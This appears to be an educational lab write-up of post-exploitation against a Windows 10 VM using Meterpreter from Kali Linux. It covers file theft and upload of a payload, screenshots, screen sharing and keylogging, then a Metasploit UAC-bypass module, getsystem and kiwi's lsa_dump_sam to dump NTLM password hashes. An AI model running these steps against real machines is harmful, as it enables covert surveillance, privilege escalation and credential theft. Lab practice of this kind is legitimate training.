# Ethical Hacking 3 - Hacking into Windows VM

<h2>Description:</h2>

- Use the Meterpreter session to gather information about the infected machine
  - Learn commands that can be used on Meterpreter to the infected machine: Sysinfo, pwd
  - Learn how to view, download, and upload files on the infected machine
  - Learn how to steal all usernames and passwords on Windows VM
  - 

<h2>Environment Used</h2>

- Kali Linux and Windows VM : 
  - Network Attached to: NAT Network
  - Name: PublicNAT
  - IP Address = 10.0.9 Network
 
- Hacking Device: Kali Linux VM
- Infected Device: Windows VM
 
- Tool Used: Metasploit's Meterpreter from Kali Linux

<h2>Remote Attack Shell with Meterpreter</h2>

- After the session is running we can type: "help" in the meterpreter to see the commands we can use on the infected machine

<br />

- To get started by gathering information about the infected machine we can use:
  - > sysinfo
  - This information gives us that the infected machine is:
    - Windows 10 64-bit
    - Build # 22621 

<p align="left">

<br />

- We can get where the victim downloaded the virus to:
  - > pwd
  - This information gives us the directory of the virus on the infected machine
 
<p align="left">

<br />

- We can check how many machines had been infected by the virus with the session command
  - > msf6 exploit(multi/handler) > sessions
  - Have to type in the background command first to go back to the exploit(multi/handler)
  - Can go back to the session with the command:
    - > sessions -i [session Id]

<h2></h2>

<h2>Viewing, Downloading, and Uploading Files with Meterpreter</h2>

- We can use the list command to see what is in the directory that the virus is downloaded on
  - > ls
  - This lists all the files on the directory that the virus is downloaded on

<p align="left">

<br />

- We can use the cat command to read the files
  - > cat desktop.ini
  - This gives the configuration information for the Windows VM
 
<p align="left">

<br />

- We can even download the files from the infected machine to our hacking device [Kali Linux] by using the download command
  - > download desktop.ini

<p align="left">

<br />

- We can change the directory for the hacking device on the infected machine by using the cd command
  - > cd ../Documents
  - This changes the directory from Download to Documents
    
<p align="left">

<br />

- We can upload our virus one more time into the infected machine's Documents directory by using the upload command
  - First, we need to find out where the virus is located in our Kali Linux hacking device
    - Our location: /home/jeff/Desktop/Diablo5.exe
  - > upload /home/jeff/Desktop/Diablo5.exe

<h2>Stealing Screenshot and Keystrokes</h2>

<p align="left">
User interface Commands <br/>

<br />

- We can grab a screenshot of the infected machine by using the screenshot command
  - > screenshot -v true
    - -v true = view the screenshot as it takes the screenshot
 
<p align="left">

<br />

- We can even view the infected machine by using the screenshare command
  - > screenshare
  - Everything the infected machine can see, the hacking device machine cand see as well


- We can capture the keystroke of the infected machine by using the keyscan_start, keyscan_dump, keyscan_stop
  - > keyscan_start
    - This will start sniffing the keystrokes on the infected machine
  - > keyscan_dump
    - This will record everything up until the command but keep sniffing the keystrokes
  - > keyscan_stop
    - This will stop sniffing the keystrokes on the infected machine
  - Can capture any keystrokes even usernames and passwords

On the infected machine, I typed: iphone 15 case then iphone 13

<h2>Gaining Admin Level Privileges on Infected Windows 10 VM</h2>

Prepping a few user accounts on the infected machine to simulate a real Device with user accounts

1. Open up cmd as administrator on Windows VM

2. Type in cmd: net user [username] [password of this user] /add
    - > net user ana Password1 /add
      > net user ben PassW0rd! /add
      > net user carol Captain12cvq /add
      > net user clark johncena35s /add
      > net user kara Aquaman123 /add
      > net user peter supeRmaN542 /add

Using Kali Linux to inject privilege escalation into Windows VM

1. On the Kali Linux Meterpreter, we have to type in "background" to go back into msf6 exploit(multi/handler)

2.  > msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_fonhelper

3.  > msf6 exploit(windows/local/bypassuac_fonhelper) > set SESSION 6

4.  > msf6 exploit(windows/local/bypassuac_fonhelper) > set LHOST 10.0.9.4 [Kali Linux IP]

5.  > msf6 exploit(windows/local/bypassuac_fonhelper) > exploit

<br />    

6. > meterpreter > getsystem
    - This command gets system level access on the Windows VM

7. > meterpreter > getuid
    - This command checks if we really have system-level access
    - NT AUTHORITY\SYSTEM = Root level

8. > meterpreter > use kiwi
   - Using a package called Kiwi for stealing the username and password

<br />    

9. > lsa_dump_sam
    - This will give us Hash NTLM
    - We can use the Hash NTLM to find the passwords
